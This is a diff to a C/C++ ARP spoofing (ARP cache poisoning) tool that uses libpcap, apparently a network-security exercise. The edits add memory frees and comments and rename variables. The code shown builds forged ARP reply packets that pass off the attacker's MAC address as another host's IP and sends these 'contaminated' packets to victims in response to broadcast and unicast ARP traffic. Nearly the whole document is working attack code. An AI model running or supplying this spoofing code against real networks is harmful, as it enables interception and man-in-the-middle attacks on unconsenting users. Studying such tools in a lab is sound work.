@@ -81,6 +81,7 @@ void* Attack(void* info){
         }
         sleep(random);
     }
+    free(attack_packet);
 }
 
 struct Info_mymac* find_My_Mac(char* dev){
@@ -230,6 +231,7 @@ ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
 
     sprintf(sender_mac, "%02x%02x%02x%02x%02x%02x", temp->sender_mac_addr[0],
 temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], temp->sender_mac_addr[4], temp->sender_mac_addr[5]);
+    free(ah);
     return (void*)(sender_mac);
 }
 
@@ -373,6 +375,9 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_ip, char
         }
         // Check broadcast packets sended by sender
         else if(isCorrect == 11){
+            // attack 2 times
+            // ************************************************************
+            // Attacker sends to sender a contaminated packet that has relation with broadcast
             struct ARP_header* Ah2 = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
             struct in_addr src_in_addr, target_in_addr;
 
@@ -394,8 +399,8 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_ip, char
             tomar_mac_addr(Ah2->src_mac_addr, attack_mac);
             tomar_mac_addr(Ah2->sender_mac_addr, attack_mac);
             bzero(Ah2->padding, 18);
+            // ************************************************************
 
-            // attack 2 times
             for(int i = 0 ; i < 2; i++){
                 if(pcap_sendpacket(handle,  reinterpret_cast<u_char*>(Ah2), 42) != 0){
                     perror("{ send packet error }");
@@ -404,39 +409,44 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_ip, char
                 printf("[ Success to send contaminated packet! ( Broadcast ) ( %d ) ]\n", i);
                 count++;
             }
+            free(Ah2);
         }
         // Check unicast packets sended by sender to target
         else if(isCorrect == 101){
-            struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
+            // ************************************************************
+            // Attacker sends to sender a contaminated packet that has relation with unicast
+            struct ARP_header* Ah2 = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
             struct in_addr src_in_addr, target_in_addr;
-            attack_packet->frame_type = htons(ARP_FRAME_TYPE);
-            attack_packet->mac_type = htons(ETHER_MAC_TYPE);
-            attack_packet->prot_type = htons(IP_PROTO_TYPE);
-            attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
-            attack_packet->prot_addr_size = IP_ADDR_LEN;
-            attack_packet->op = htons(OP_ARP_REPLY);
 
+            Ah2->frame_type = htons(ARP_FRAME_TYPE);
+            Ah2->mac_type = htons(ETHER_MAC_TYPE);
+            Ah2->prot_type = htons(IP_PROTO_TYPE);
+            Ah2->mac_addr_size = ETH_MAC_ADDR_LEN;
+            Ah2->prot_addr_size = IP_ADDR_LEN;
+            Ah2->op = htons(OP_ARP_REPLY);
+
+            // target -> sender
             tomar_ip_addr(&src_in_addr, argv[cnt_session+1]);
             tomar_ip_addr(&target_in_addr, argv[cnt_session]);
+            memcpy(Ah2->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
+            memcpy(Ah2->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
-            tomar_mac_addr(attack_packet->Destination_mac_addr, smac[i]);
-            tomar_mac_addr(attack_packet->target_mac_addr, smac[i]);
-            tomar_mac_addr(attack_packet->src_mac_addr, attack_mac);
-            tomar_mac_addr(attack_packet->sender_mac_addr, attack_mac);
-
-            memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
-            memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
-
-            bzero(attack_packet->padding, 18);
+            tomar_mac_addr(Ah2->Destination_mac_addr, smac[i]);
+            tomar_mac_addr(Ah2->target_mac_addr, smac[i]);
+            tomar_mac_addr(Ah2->src_mac_addr, attack_mac);
+            tomar_mac_addr(Ah2->sender_mac_addr, attack_mac);
+            bzero(Ah2->padding, 18);
+            // ************************************************************
 
             for(int i = 0 ; i < 2; i++){
-                if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
+                if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(Ah2), 42) != 0){
                     perror("{ send packet error }");
                     exit(1);
                 }
                 printf("[ Success to send contaminated packet! ( Unicast ) ( %d ) ]\n", i);
                 count++;
             }
+            free(Ah2);
         }
         else{
             printf("{ This packet has no relation with this program. }\n");
